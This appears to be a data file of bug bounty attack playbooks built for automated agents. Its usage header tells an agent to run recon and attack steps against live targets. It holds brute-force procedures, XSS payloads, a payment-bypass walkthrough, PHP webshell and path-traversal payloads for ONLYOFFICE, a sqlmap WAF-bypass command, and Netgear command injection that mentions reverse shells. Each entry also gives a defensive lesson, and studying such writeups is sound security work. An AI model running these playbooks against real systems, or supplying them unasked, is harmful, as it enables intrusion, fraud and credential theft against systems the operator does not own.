description: Agent-ready bug bounty playbooks extracted from writeups.json. Same schema as agent_playbooks_github.json — safe to merge.

usage.step_1: Load tactic_index.json and look up your target's technology under by_technology to get relevant playbook IDs.
usage.step_2: Filter by by_access_level matching your current access to the target.
usage.step_3: Prioritize IDs in high_confidence and quick_wins lists for best hit rate.
usage.step_4: Load matching playbooks from this file by their 'id' field.
usage.step_5: Check trigger_conditions.prerequisites and applicability_signals against the live target.
usage.step_6: If conditions match, run attack_playbook.recon_steps first, then attack_steps.
usage.step_7: Confirm with success_indicators. If failed, use failure_indicators to pivot.

meta.title: Better Make Sure Your Password Manager Is Secure

target_profile.technology: Password Manager (specifically, Password Safe), likely a self-hosted or enterprise solution
tech_stack_fingerprints: Password Safe's authentication behavior (lack of proper rate limiting or account lockout)

trigger_conditions.when_to_apply: When the target system uses a password manager that lacks robust brute-force protection on its login endpoint.
prerequisites: The target system uses a password manager with a web-based login interface.
applicability_signals: The login endpoint does not implement account lockout or rate limiting after multiple failed login attempts.
skip_if: The login endpoint implements strict rate limiting or account lockout after a small number of failed attempts.

recon_steps: Step 1: Identify the login endpoint for the password manager.
Step 2: Attempt to log in with a known invalid username and password multiple times to observe rate limiting or lockout behavior.
attack_steps: Step 1: Send repeated POST requests to the login endpoint with a valid username but iterating through common or leaked passwords (or a dictionary of passwords).
Step 2: Continue brute-forcing until a valid password is found.
Step 3: Once authenticated, proceed with further actions as an authorized user.
tools_recommended: Burp Suite Intruder: Configure to brute-force the password parameter with a wordlist.
Custom Python script: For automated brute-forcing if more complex logic is needed.
success_indicators: Successful authentication (e.g., HTTP 302 redirect to the dashboard or a session cookie being set).
Response body indicating successful login with user-specific data.
failure_indicators: Receiving 429 Too Many Requests or similar rate-limiting responses.
Account lockout response after a few attempts → pivot to other attack vectors or try with different usernames if enumeration is possible.

playbooks.impact: Full account takeover of the password manager, granting access to all stored credentials, sensitive information, and potentially enabling further attacks by using compromised credentials.
playbooks.key_lesson: Always implement robust rate limiting and account lockout mechanisms on authentication endpoints to prevent brute-force attacks.

meta.title: I Hope This Sticks: Analyzing ClipboardEvent Listeners for Stored XSS

tech_stack_fingerprints: Protocol Buffers (implied by ZDC copy objects)

trigger_conditions.when_to_apply: When a web application processes pasted data containing `text/html` content, and this content is not properly sanitized before being rendered.
prerequisites: Attacker must have an authenticated account on the target application.
The application must have a feature that accepts pasted content (e.g., a rich text editor, whiteboard).
applicability_signals: Application listens for 'paste' events.
Application uses `event.clipboardData.getData('text/html')` to retrieve pasted content.
Pasted HTML content is rendered on the page without adequate sanitization.
skip_if: The application explicitly sanitizes or strips all HTML tags from pasted content.
The application only accepts plain text for pasting.

recon_steps: Analyze client-side JavaScript for paste event listeners.
Identify how pasted data, specifically `text/html`, is handled by the application. Look for calls to `event.clipboardData.getData()` and subsequent rendering logic.
attack_steps: Step 1: Craft an HTML payload containing a script tag, e.g., ``.
Step 2: Use browser developer tools or a custom script to set this crafted HTML as the content of the clipboard's `text/html` type.
Step 3: Trigger a paste event within the Zoom Whiteboard feature (or any identified vulnerable component) on the target application.
Step 4: Observe if the JavaScript payload within the crafted HTML is executed.
tools_recommended: Browser Developer Tools: To inspect event listeners and manually set clipboard data.
Custom JavaScript: To programmatically set clipboard data and trigger paste events.
success_indicators: An alert box displaying the document domain (e.g., `alert(document.domain)`) is shown.
Arbitrary JavaScript execution is confirmed by observing side effects (e.g., console logs, network requests).
failure_indicators: Pasted content is rendered as plain text without executing any HTML tags or JavaScript.
A WAF or Content Security Policy blocks the script execution (e.g., 403 Forbidden, CSP violation logs).
The application displays an error message indicating invalid data format.

playbooks.impact: An attacker can execute arbitrary JavaScript within the context of the victim's browser session on the Zoom Whiteboard. This can lead to session hijacking, data exfiltration (e.g., sensitive information displayed on the whiteboard, user details), and performing actions on behalf of the user within the whiteboard feature.
playbooks.key_lesson: Always sanitize and properly encode `text/html` data retrieved from user-controlled sources, especially when using clipboard events, to prevent stored XSS.

meta.title: The Bug That Kept On Giving :: PaymentBypass :: Response Manipulation

trigger_conditions.when_to_apply: This technique is applicable when a web application relies on client-side JavaScript to process payment responses and redirects the user based on the content of these responses, without sufficient server-side validation of the transaction status.
prerequisites: The target application has a payment flow where the user interacts with a card payment method.
The application performs an AJAX POST request to '/v1/Payment'.
applicability_signals: JavaScript code that makes AJAX requests to '/v1/Payment' and '/v1/HandleResponse'.
JavaScript code that redirects the user based on a variable `action` which is populated from server responses.
skip_if: Server-side validation of payment status is robust and not solely reliant on client-side JavaScript interpretation.
The '/v1/Payment' endpoint consistently returns non-200 status codes for invalid payment attempts.

recon_steps: Step 1: Navigate through the gift card purchasing process on <TARGET_URL> to reach the payment page.
Step 2: Use browser developer tools or Burp Suite to inspect network requests and responses, specifically looking for JavaScript code that handles payment processing and response parsing.
attack_steps: Step 1: Add an item to the cart and proceed to checkout on <TARGET_URL>.
Step 2: Fill in user details and proceed to the payment page.
Step 3: Select 'pay with card' and enter test card details (e.g., '1337 1337 1337 1337', expiry '03/30').
Step 4: Initiate the checkout process but do not send the request yet. Ensure the 'POST /v1/Payment' request is captured by the intercepting proxy (e.g., Burp Suite).
Step 5: Forward the captured 'POST /v1/Payment' request.
Step 6: Intercept the response to the 'POST /v1/Payment' request. Observe the response body, which should contain a JSON object with a 'data' field.
Step 7: Modify the 'data' field from its original value (e.g., 'Refused') to 'Authorised'.
Step 8: Forward the modified response and allow the subsequent requests to proceed to the server.
Step 9: Turn off intercept and observe the application's behavior and check for confirmation emails.
tools_recommended: Burp Suite: For intercepting and modifying HTTP requests and responses.
Browser Developer Tools: For inspecting JavaScript code and network traffic.
success_indicators: Successful redirection to a confirmation page after the modified 'Refused' response.
Receipt of a confirmation email for the previously failed transaction.
The JavaScript variable `action` being set to 'Authorised' after response manipulation.
failure_indicators: The server rejects the modified response and still redirects to the cart page (indicating server-side validation).
A different status code is returned or an error message is displayed indicating the manipulation was detected.
The 'POST /v1/HandleResponse' request fails or returns an error after modifying the '/v1/Payment' response.

playbooks.impact: An attacker can bypass payment verification, allowing them to obtain e-gift cards or other purchased items without actual payment. This can lead to financial loss for the vendor.
playbooks.key_lesson: Never trust client-side JavaScript for critical business logic like payment authorization; always perform server-side validation of transaction states and outcomes.

meta.title: Missing Bricks: Finding Security Holes in LEGO APIs
meta.vuln_type: Account Takeover | Data Leakage | Access to Internal Data

trigger_conditions.when_to_apply: When an attacker has an authenticated session with a LEGO account and can identify parameters related to user accounts or data retrieval.
prerequisites: Attacker must have a valid authenticated session for a LEGO account.
applicability_signals: Existence of API endpoints that manage user accounts or retrieve user data.
Ability to observe API requests and responses related to user profiles or data.
skip_if: No observable API endpoints related to user management or data access.
All API requests require strict input validation that prevents manipulation of account identifiers or data access patterns.

recon_steps: Step 1: Observe network traffic during normal authenticated user operations on LEGO's online services to identify API endpoints related to account management and data retrieval.
Step 2: Analyze API requests for parameters that might control user account access or data retrieval, looking for predictable patterns like user IDs, session tokens, or data identifiers.
attack_steps: Step 1: Attempt to manipulate identified parameters in API requests to access or modify other users' accounts or data. (Specific endpoints and parameters are not detailed in the writeup).
Step 2: Test for the ability to leak Personally Identifiable Information (PII) and other sensitive data by altering requests.
Step 3: Explore access to internal production data by attempting to access resources beyond the scope of a typical authenticated user.
tools_recommended: Burp Suite or similar proxy to intercept and modify API requests.
success_indicators: Successful retrieval of another user's PII or sensitive account information.
Confirmation of access to internal production data or systems.
Ability to perform actions on behalf of other users or gain administrative-level access.
failure_indicators: API responses indicating invalid requests (e.g., 400 Bad Request) or unauthorized access (e.g., 401 Unauthorized, 403 Forbidden) without successful data leakage or account manipulation.
Lack of observable change in response data when manipulating parameters.

playbooks.impact: Complete control over service users' accounts, leakage of PII and sensitive internal data, and access to internal production data potentially leading to full compromise of the company's internal servers.
playbooks.key_lesson: Thoroughly test API endpoints that manage user accounts and data for authorization bypasses and data leakage vulnerabilities, especially in rapidly growing platforms.

meta.title: FlowscreenComponents Basepack, Version 3.0.7 Advisory

tech_stack_fingerprints: JavaScript libraries/frameworks common in web applications

trigger_conditions.when_to_apply: This vulnerability is applicable to the FlowscreenComponents Basepack versions prior to 3.0.8. It involves unsanitized user input being rendered in the browser, leading to Cross-Site Scripting (XSS).
prerequisites: The target must be using FlowscreenComponents Basepack version prior to 3.0.8.
applicability_signals: The presence of components that accept user-provided input and render it without proper sanitization.
skip_if: The target is using FlowscreenComponents Basepack version 3.0.8 or later.
All user-provided input is properly sanitized before being rendered in the web interface.

recon_steps: Step 1: Identify components within the application that utilize FlowscreenComponents Basepack and accept user-generated input.
Step 2: Review the source code or observe the behavior of these components to determine if user input is being rendered directly in the HTML response without sanitization.
attack_steps: Step 1: Identify an input field or parameter that is not properly sanitized by FlowscreenComponents Basepack.
Step 2: Submit a malicious payload, such as an XSS vector (e.g., `<script>alert(1)</script>`), as input to the identified field/parameter.
Step 3: Observe the application's response to see if the payload is executed, indicating successful XSS.
tools_recommended: Burp Suite: Intercept and modify HTTP requests to inject XSS payloads.
Browser Developer Tools: Inspect HTML source and JavaScript execution to confirm payload delivery and execution.
success_indicators: The injected `<script>` tag is rendered as executable JavaScript in the browser.
An alert box with the specified message (e.g., 'XSS') appears in the browser.
failure_indicators: The injected payload is HTML-encoded or stripped from the response, and no script execution occurs. In this case, further investigation into specific input handling within FlowscreenComponents would be required.

playbooks.impact: An attacker can inject arbitrary JavaScript code into the browser of other users who interact with the vulnerable component. This can lead to session hijacking, defacement, phishing attacks, or redirection to malicious sites.
playbooks.key_lesson: Always sanitize user-provided input before rendering it in the browser to prevent Cross-Site Scripting vulnerabilities.

meta.title: Exploiting ONLYOFFICE Web Sockets for Unauthenticated Remote Code Execution

trigger_conditions.when_to_apply: When ONLYOFFICE is deployed and accessible via its web interface, particularly if WebSocket connections are utilized for real-time features.
prerequisites: Target must be running ONLYOFFICE
Target must be accessible over the internet or a network reachable by the attacker
applicability_signals: Presence of WebSocket connections when interacting with the ONLYOFFICE web application
Specific ONLYOFFICE endpoints that handle document collaboration or real-time updates
skip_if: WAF blocks WebSocket connections
ONLYOFFICE is configured to disallow or heavily restrict WebSocket traffic

recon_steps: Step 1: Identify if the target is running ONLYOFFICE by browsing its web interface and observing network traffic for WebSocket connections.
Step 2: Analyze the WebSocket messages for patterns related to document handling, user collaboration, or file operations to understand potential data flows and command structures.
attack_steps: Step 1: Establish a WebSocket connection to the ONLYOFFICE server using tools like `wscat` or a custom script.
Step 2: Craft and send a malicious WebSocket message that exploits the vulnerability. The specific message format exploits arbitrary file write via path traversal, leading to RCE.

Step 3: The payload involves sending a crafted message that instructs the server to write a malicious script (e.g., a PHP webshell) to a specific location on the server by abusing path traversal within the WebSocket data handling.
Step 4: Access the uploaded webshell via HTTP to execute arbitrary commands on the server.
payloads_or_patterns: WebSocket message with crafted data to exploit path traversal for arbitrary file write, e.g., `["sync","0",{"type":"sync","id":"doc1","version":1,"operations":[{"type":"insert","range":[0,0],"text":"<?php system($_GET[‘cmd’]); ?>"}]}]` sent to a document sync endpoint, followed by a path traversal sequence to write to a web-accessible directory.
HTTP request to the uploaded webshell, e.g., `GET <TARGET_URL>/path/to/webshell.php?cmd=id`
tools_recommended: wscat: For establishing and interacting with WebSocket connections.
Burp Suite: To intercept and analyze WebSocket traffic, and to craft malicious payloads.
Custom Python script: For automating the WebSocket connection and payload sending process.
success_indicators: Receiving a HTTP 200 OK response when accessing the uploaded webshell.
Execution of commands via the webshell, e.g., the output of `id` or `whoami` is returned in the HTTP response.
failure_indicators: WebSocket connection fails or is closed prematurely.
The server responds with an error message indicating invalid data or permission denied when attempting to write the file.
The webshell returns a 404 Not Found error, indicating the file was not written successfully to a web-accessible path.
If RCE is not achieved, pivot to other vulnerabilities like XSS or information disclosure within WebSocket messages.

playbooks.impact: Unauthenticated Remote Code Execution (RCE) on the ONLYOFFICE server, allowing an attacker to execute arbitrary commands with the privileges of the ONLYOFFICE application process. This can lead to full server compromise, data theft, or further lateral movement within the network.
playbooks.key_lesson: Always scrutinize WebSocket message handling for vulnerabilities such as path traversal, deserialization flaws, or injection, as they often operate with fewer security checks than traditional HTTP requests.

meta.title: CVE-2021-43444 to 43449: Exploiting ONLYOFFICE Web Sockets for Unauthenticated Remote Code Execution

tech_stack_fingerprints: WebSocket connections to the target server
ONLYOFFICE specific file formats or operations (implied by the context of ONLYOFFICE)

trigger_conditions.when_to_apply: This vulnerability is applicable when the ONLYOFFICE application is exposed and accessible over the internet, allowing unauthenticated WebSocket connections.
prerequisites: Target is running an affected version of ONLYOFFICE.
applicability_signals: Target responds to WebSocket connection requests.
Specific error messages or behavior observed during WebSocket communication that indicates the vulnerability.
skip_if: Target does not expose WebSocket endpoints.
Network firewalls or WAFs block WebSocket connections.
ONLYOFFICE instances are not exposed externally.

recon_steps: Step 1: Identify if the target OnlyOffice instance is accessible via WebSockets. This can be done by observing network traffic when interacting with the web interface or by directly attempting to establish a WebSocket connection to common OnlyOffice WebSocket endpoints.
Step 2: Analyze the WebSocket communication to look for specific patterns or messages that align with the CVEs, particularly those related to document processing or collaboration features.
attack_steps: Step 1: Initiate a WebSocket connection to the target OnlyOffice instance.

Step 2: Send specially crafted WebSocket messages that exploit the vulnerability. The writeup implies sending messages that lead to arbitrary file writes or path traversal, potentially through document processing commands.

Step 3: For RCE, leverage the file write vulnerability to place a malicious executable or script in a web-accessible directory or a location that is executed by the server. This often involves path traversal to write files outside of intended directories.
Step 4: Trigger the execution of the placed file, for example, by requesting it through a web browser or by exploiting another mechanism within OnlyOffice that would execute such files.
payloads_or_patterns: Insufficient detail in writeup for specific WebSocket message payloads. The exploit involves arbitrary file writes and path traversal, leading to RCE. Payloads would likely be related to file path manipulation and code injection through document processing functionalities. Example: A sequence of WebSocket messages designed to write a file like `../../../../var/www/html/shell.php` with PHP code like `<?php system($_GET['cmd']); ?>`.
tools_recommended: Burp Suite (or similar proxy) with WebSocket support to intercept and manipulate WebSocket traffic.
Custom scripts (e.g., Python with websockets library) to automate sending crafted WebSocket messages.
success_indicators: Successful arbitrary file write to an arbitrary location on the server.
Execution of a command through the placed malicious file (e.g., `whoami`, `ls` via `?cmd=...` parameter if a PHP shell was placed).
Receipt of a reverse shell connection on an attacker-controlled server.
failure_indicators: WebSocket connection is refused or closed immediately.
Error messages indicating invalid messages or permissions.
File write attempts result in errors or are restricted to unintended locations.
Placed files are not executed or are detected as malicious.
Response: 403 Forbidden on attempted execution of payload.

playbooks.impact: Unauthenticated Remote Code Execution on the target ONLYOFFICE server, allowing an attacker to run arbitrary commands with the privileges of the ONLYOFFICE process. This can lead to complete system compromise, data exfiltration, and further lateral movement within the network.
playbooks.key_lesson: Always investigate WebSocket communication for vulnerabilities, especially in applications that handle file uploads, document processing, or collaborative features, as they can be vectors for unauthenticated RCE.

meta.title: Exploiting an SQL injection with WAF bypass

trigger_conditions.when_to_apply: When a web application endpoint accepts an integer ID parameter, and standard SQL injection tools like sqlmap fail to detect a vulnerability, but manual testing reveals behavioral differences based on valid/invalid IDs and boolean logic.
prerequisites: The target application is vulnerable to SQL injection.
A WAF or similar security mechanism is likely blocking standard SQL injection payloads.
applicability_signals: Endpoint accepts an `idEntity` parameter.
Responses contain a `nameEntity` field that reflects the provided ID.
Providing an invalid ID results in an empty `nameEntity`.
Burp Suite scanner flags the `idEntity` parameter for potential SQL injection.
sqlmap fails to detect SQL injection using default settings.
skip_if: No `nameEntity` field is present in the response.
The `idEntity` parameter is not present or not used in the query.
The application returns specific error messages for invalid inputs rather than controlled empty fields.

recon_steps: Step 1: Use Burp Suite Repeater to send a GET request to the target endpoint with a valid `idEntity` (e.g., `GET /endpoint?idEntity=442`). Observe the response for the `nameEntity` field.
Step 2: Send a GET request with an invalid `idEntity` (e.g., `GET /endpoint?idEntity=0`). Observe that the `nameEntity` field is empty.
Step 3: If Burp Suite scanner flagged the endpoint, review the scanner's generated requests. Analyze the observed boolean-based SQL injection payloads and their responses.
attack_steps: Step 1: Craft a boolean-based SQL injection payload by appending `OR 1=1` to a valid or invalid ID. For example: `GET /endpoint?idEntity=44252262402+OR+2346=2346`. Observe the `nameEntity` in the response.

Step 2: If the previous step returns a populated `nameEntity` (indicating the condition was bypassed and an entity was returned), infer that the ID parameter is injectable. This confirms a boolean-blind SQL injection.
Step 3: Configure sqlmap to use the boolean-blind technique (`--technique=B`) and specify the expected failure string (`--not-string='NameEntity=""'` based on invalid ID behavior).

Step 4: Run sqlmap with the crafted payload or a derived one, and the identified parameters and techniques: `sqlmap -u "<TARGET_URL>/endpoint?idEntity=44252262402+OR+1=1" -p idEntity --technique=B --not-string='NameEntity=""' --cookie="<SESSION_TOKEN>"` (assuming session token is required).
tools_recommended: Burp Suite Repeater: Manual analysis of request/response behavior.
sqlmap: For automated exploitation once the injection technique is identified.
success_indicators: sqlmap successfully extracts database information (e.g., database names, table names, data).
Confirmation that the `nameEntity` field contains data from an unexpected or enumerated entity, and that this behavior is consistent with SQL injection.
failure_indicators: sqlmap continues to report no injection after configuring boolean-blind technique and `not-string` (suggests WAF is still blocking, or the injection is not boolean-blind). Pivot to other WAF bypass techniques.
Manual boolean tests do not yield consistent results (suggests the vulnerability is not SQL injection or is more complex).

playbooks.impact: Data exfiltration from the database, including sensitive information associated with entities (e.g., user details, financial data). Potential for further database manipulation if the injection is not restricted to boolean-blind.
playbooks.key_lesson: When standard SQL injection tools fail, manually verify boolean-blind SQL injection by observing response behavior with crafted OR conditions and then re-run the tool with appropriate flags like `--technique=B` and `--not-string`.

meta.title: CVE-2022-20942: It's not old functionality, it's vintage

tech_stack_fingerprints: Cisco IOS XE specific HTTP responses or behaviors

trigger_conditions.when_to_apply: When the Cisco IOS XE device has the Web UI feature enabled and is accessible over the network.
prerequisites: The target device must be running a vulnerable version of Cisco IOS XE.
The Web UI feature must be enabled on the target device.
applicability_signals: HTTP responses from the device that indicate it is running Cisco IOS XE and has the Web UI enabled.
skip_if: The Web UI feature is disabled on the target device.
The target device is not running a vulnerable version of Cisco IOS XE.

recon_steps: Step 1: Identify Cisco IOS XE devices on the network. This can be done via network scanning and banner grabbing for specific HTTP headers or HTML content indicative of Cisco devices.
Step 2: Confirm the Web UI feature is enabled by attempting to access common Web UI endpoints (e.g., `/`, `/level/15/exec/-`).
attack_steps: Step 1: Send a crafted HTTP request to the device's Web UI interface.
Step 2: The request targets the /webui/logout.html endpoint with a specific query parameter to trigger the vulnerability.
Step 3: Observe the response for leaked information.
tools_recommended: Nmap: for initial host discovery and banner grabbing.
curl: for sending crafted HTTP requests.
success_indicators: The HTTP response contains clear text credentials or other sensitive information such as username and password hashes.
failure_indicators: The HTTP response is a standard logout page or indicates an error without revealing credentials. In such cases, verify if the Web UI is enabled and the target is vulnerable, or attempt other known Cisco IOS XE vulnerabilities.

playbooks.impact: An unauthenticated attacker can obtain plaintext credentials, leading to full administrative control over the affected Cisco IOS XE devices.
playbooks.key_lesson: Always test unauthenticated endpoints on network devices for information disclosure, especially for credentials, as default configurations or older versions may expose sensitive data.

meta.title: Public Report – VPN by Google One Security Assessment

affected_components: VPN configuration handling within the Android application

trigger_conditions.when_to_apply: When the VPN application stores sensitive configuration data insecurely on the Android device, allowing local access to this data by other applications.
prerequisites: Attacker must have the ability to install applications on the target Android device.
applicability_signals: The VPN application stores configuration details (like server addresses, credentials, or unique identifiers) in files accessible by other applications on the device.
Analysis of the Android application's storage reveals improperly secured configuration files.
skip_if: All configuration data is stored using Android's secure storage mechanisms (e.g., Keystore) or is encrypted such that local access by other apps is not possible.

recon_steps: Step 1: Download and decompile the VPN application's APK file.
Step 2: Analyze the decompiled code and file system structure for stored configuration files, particularly those related to server connections or authentication.
attack_steps: Step 1: Identify the location of stored VPN configuration files on an Android device where the VPN application is installed.

Step 2: Access these configuration files using a method that bypasses standard Android application sandboxing (e.g., through another malicious app with appropriate permissions or by directly accessing the file system if possible).

Step 3: Parse the retrieved configuration data to extract sensitive information such as server endpoints, user IDs, or any other credentials or identifiers that could be used to impersonate a user or identify their configuration.
tools_recommended: jadx or similar Android decompilers
ADB (Android Debug Bridge) for file system access (if applicable)
success_indicators: Discovery of sensitive configuration data within local files that should have been protected.
Ability to extract server addresses or identifiers that are unique to a user's VPN configuration.
failure_indicators: Configuration files are not found, or they are empty or contain only obfuscated/unreadable data.
All sensitive data is confirmed to be stored securely via Android's Keystore or equivalent encryption methods.

playbooks.impact: An attacker can gain access to sensitive configuration details of a VPN user, potentially allowing them to understand the target's VPN setup, identify specific server configurations, or in certain scenarios, attempt to impersonate the user if authentication tokens or session information are inadvertently stored.
playbooks.key_lesson: Always review how sensitive configuration data is stored by mobile applications, ensuring it leverages platform-provided secure storage mechanisms and avoids plaintext or easily accessible storage that could lead to IDOR vulnerabilities.

meta.title: {JS-ON: Security-OFF}: Abusing JSON-Based SQL to Bypass WAF
meta.programs: Palo Alto Networks, AWS, Cloudflare, F5, Imperva

affected_components: SQL injection detection logic in WAFs
tech_stack_fingerprints: Presence of WAF from Palo Alto Networks, AWS, Cloudflare, F5, or Imperva

trigger_conditions.when_to_apply: This technique is applicable when a web application is protected by one of the targeted WAF vendors and the application is vulnerable to SQL injection, but the WAF is not configured to parse JSON syntax within SQL queries.
prerequisites: The target application must be vulnerable to SQL injection.
The WAF must not have specific rules to parse JSON syntax within SQL injection attempts.
applicability_signals: Observation of WAFs from Palo Alto Networks, AWS, Cloudflare, F5, or Imperva protecting the target.
Successful detection of basic SQL injection payloads by the WAF indicates a potential for bypass using more complex techniques.
skip_if: WAF blocks all SQL injection attempts, including those with JSON syntax.
The target application is not vulnerable to SQL injection.

recon_steps: Step 1: Identify the WAF vendor protecting the target application through banner grabbing, response headers, or known WAF fingerprints.
Step 2: Attempt basic SQL injection payloads to confirm vulnerability and WAF blocking behavior.
attack_steps: Step 1: Construct a SQL injection payload that includes JSON syntax. For example, prepend JSON syntax to a standard SQL injection payload.
Step 2: Send the crafted payload to the vulnerable endpoint, ensuring it passes through the WAF.
Step 3: Analyze the response for signs of successful exploitation, such as data exfiltration or unintended application behavior.
payloads_or_patterns: Example payload structure: JSON_syntax UNION SELECT <SQL_payload>
A more advanced payload example: `); SELECT * FROM users WHERE username = 'admin' AND password LIKE '%<HASHED_PASSWORD>%` -- /*
Example of JSON syntax used in SQL: `{"some_key": "some_value"}`
tools_recommended: Burp Suite: For crafting and sending HTTP requests, and intercepting responses.
SQLMap: Potentially adaptable for testing JSON-based SQLi, though manual crafting may be more effective initially.
success_indicators: WAF does not block the request.
The application returns data that should not be accessible (e.g., user information, database schema details).
Blind SQL injection indicators (e.g., time delays, boolean-based responses).
failure_indicators: WAF blocks the request with a 403 Forbidden or similar status code.
Application returns an error indicating invalid syntax or no change in behavior.
If standard SQLi works but JSON-based SQLi is blocked, it indicates the WAF has updated its JSON parsing rules.

playbooks.impact: An attacker can bypass WAF protections and exploit underlying SQL injection vulnerabilities to exfiltrate sensitive data, gain unauthorized access to systems, or perform other malicious actions.
playbooks.key_lesson: WAFs may fail to parse complex or non-standard syntax within malicious payloads; research database engine capabilities to find syntax the WAF might overlook for bypass.

meta.title: Slides
meta.programs: Palo Alto Networks, AWS, Cloudflare, F5, Imperva

trigger_conditions.when_to_apply: When a web application exhibits SQL injection vulnerabilities and is protected by a WAF that can be bypassed.
prerequisites: Target web application is vulnerable to SQL injection.
applicability_signals: Web application firewall is in place (indicated by potential blocking of standard SQLi payloads).
skip_if: No SQL injection vulnerabilities are present on the target.
WAF successfully blocks all SQL injection attempts.

recon_steps: Step 1: Identify potential SQL injection points by sending various payloads to parameters and observing response behavior.
Step 2: Test standard SQL injection payloads (e.g., ' OR 1=1 --, UNION SELECT) to determine if WAF is blocking them.
attack_steps: Step 1: Craft a SQL injection payload that bypasses common WAF rules. The provided PDF content likely contains such a payload, although it is obfuscated.
Step 2: Send the crafted SQL injection payload to a vulnerable parameter on the target web application.
Step 3: Analyze the response for indicators of successful SQL injection, such as altered data or error messages that reveal backend information.
payloads_or_patterns: Obfuscated SQL injection payloads found within the provided PDF content. Actual usable payload requires deobfuscation and contextual adaptation.
tools_recommended: Burp Suite or OWASP ZAP for intercepting and modifying requests, and for fuzzing.
A PDF reader to examine the provided content for potential payloads.
success_indicators: Successful retrieval of unintended data (e.g., database tables, user credentials).
Error messages revealing database structure or sensitive information.
Changes in application behavior that indicate data manipulation.
failure_indicators: WAF blocking page (e.g., 403 Forbidden, custom WAF block page).
No change in application behavior or data. Suggestion: Attempt different WAF bypass techniques or obfuscation methods.

playbooks.impact: Execution of arbitrary SQL queries against the backend database, potentially leading to data exfiltration, modification, or deletion. In some cases, this could lead to further exploitation such as remote code execution if the database has such capabilities.
playbooks.key_lesson: Web Application Firewalls are not foolproof and can be bypassed using creative obfuscation and evasion techniques. Always test for SQL injection even when a WAF is present, and research WAF bypass methods.

meta.title: Race Condition vulnerability in Azure Video Indexer allowed trial account users use Advance / Premium feature

affected_components: Trial account free trial feature for 'Animated Characters'

trigger_conditions.when_to_apply: When a trial account is used for Azure Video Indexer and the 'Animated Characters' feature is accessible, and it's possible to intercept and manipulate HTTP requests.
prerequisites: Attacker must have access to a trial account for Azure Video Indexer.
Attacker must be able to use a proxy tool (e.g., Burp Suite, mitmproxy) to intercept and modify HTTP requests.
applicability_signals: The presence of the 'Animated Characters' feature in the Video Indexer trial account.
The client-side and server-side validation enforcing a limit of one model per trial account.
The endpoint '/trial/accounts/$ACCOUNT_ID/Customization/AnimationModels' exists and accepts POST requests.
skip_if: Trial accounts are disabled for the 'Animated Characters' feature.
The server-side validation is extremely robust and cannot be bypassed by concurrent requests.
The API returns persistent errors for all concurrent requests indicating rate limiting or other protective measures.

recon_steps: Step 1: Login to Azure Video Indexer using a trial account.
Step 2: Navigate to 'Model customizations' -> 'Animated Characters' and observe the limitation of one model per trial account.
Step 3: Confirm the existence of the POST endpoint for adding animation models by intercepting a valid request.
attack_steps: Step 1: Configure a proxy tool (e.g., Burp Suite) and intercept the POST request made when adding an animation model.
Step 2: Forward the intercepted request to Burp Intruder.
Step 3: Configure Burp Intruder to attack the 'name' parameter within the JSON payload.
Step 4: Set the attack type to 'Sniper' or 'Cluster Bomb' and use a payload list of numeric or alphanumeric strings (e.g., 500-1000 unique names).
Step 5: Set 'Max concurrent requests' to a high value (e.g., 300-600).
Step 6: Start the Intruder attack.
Step 7: Monitor the responses for successful creations (e.g., HTTP 201).
tools_recommended: Burp Suite (Intruder tab for fuzzing, Proxy tab for interception)
mitmproxy
success_indicators: Receiving multiple HTTP 201 'Created' responses for concurrent requests.
Observing that the trial account now contains an 'N' number of animation models, exceeding the one-model limit.
failure_indicators: Receiving consistent HTTP 4xx or 5xx errors for all concurrent requests (indicates rate limiting or other security measures).
The number of created models remains limited to one (indicates the race condition is not exploitable or has been patched).

playbooks.impact: Allows trial account users to bypass limitations and gain access to advanced/premium features ('Animated Characters' models) without payment, leading to potential revenue loss for the provider and reputational damage.
playbooks.key_lesson: When testing APIs that enforce limits on trial accounts, attempt to bypass these limits by exploiting race conditions through concurrent requests targeting state-changing operations.

prerequisites: insufficient detail in writeup
applicability_signals: insufficient detail in writeup
skip_if: insufficient detail in writeup

recon_steps: Step 1: Identify if the target application uses Spring or Grails frameworks by checking response headers or common file paths.

Step 2: Determine the specific version of Spring or Grails being used. If version information is not readily available, attempt to fingerprint known vulnerable versions through indirect means or by testing for specific CVEs.
attack_steps: Step 1: Craft a malicious payload that exploits a data binding vulnerability to achieve RCE. This typically involves manipulating request parameters to instantiate and execute arbitrary code.
Step 2: Send the crafted payload to the target application, targeting an endpoint or function that is vulnerable to data binding manipulation.
Step 3: Monitor the response for signs of code execution or unexpected behavior. This may involve observing outbound network connections, file system modifications, or specific error messages.
tools_recommended: Burp Suite: To intercept and modify HTTP requests, craft payloads, and analyze responses.

success_indicators: Successful execution of arbitrary commands on the server.
Receiving a reverse shell connection from the target.
Observable changes on the server, such as creation of specific files or modification of system settings.
Specific error messages or stack traces indicating successful exploitation.

playbooks.impact: Achieve Remote Code Execution (RCE) on the target server, allowing an attacker to run arbitrary commands, access sensitive data, install malware, or gain full control of the compromised system.

meta.title: Cool Vulns Don't Live Long - Netgear And Pwn2Own

trigger_conditions.when_to_apply: This vulnerability is applicable when the target is a Netgear RAX30 router running firmware version 1.0.7.78 or similar, and the attacker can send HTTP requests to the router's web interface (typically on port 80).
prerequisites: The router must be accessible over the network, allowing HTTP requests.
applicability_signals: The presence of the `/bin/puhttpsniff` binary within the firmware filesystem.
The `puhttpsniff` binary inserts NFLOG iptables rules related to port 80.
The `puhttpsniff` binary uses `sscanf` to parse the 'User-Agent' header and then uses `system()` with the parsed string.
skip_if: The 'User-Agent' header is sanitized or the 'User-Agent' string is not used in a `system()` call.

recon_steps: Step 1: Download Netgear RAX30 firmware version 1.0.7.78 from the official website.
Step 2: Extract the firmware filesystem using `binwalk`.
Step 3: Identify executable binaries in the `/bin` directory, specifically looking for files like `puhttpsniff`.

Step 4: Analyze the `puhttpsniff` binary using `strings` and reverse engineering tools (e.g., Ghidra, IDA Pro) to understand its functionality, particularly its interaction with iptables and user-supplied input.
attack_steps: Step 1: Send an HTTP GET request to the router's IP address (e.g., `http://192.168.1.1`).
Step 2: Craft a custom 'User-Agent' header containing a command injection payload.
Step 3: The `puhttpsniff` binary will parse the 'User-Agent' header and execute the injected command via `system()`.
tools_recommended: curl: for sending crafted HTTP requests.
Burp Suite: for intercepting and modifying HTTP requests.
Ghidra/IDA Pro: for firmware analysis and binary reverse engineering.
binwalk: for firmware file extraction.
success_indicators: The router reboots unexpectedly (as demonstrated with `/sbin/reboot`).
A reverse shell connection is established from the router to the attacker's machine.
Files are downloaded to the router or executed as intended by the payload.
failure_indicators: The router does not reboot or show any abnormal behavior.
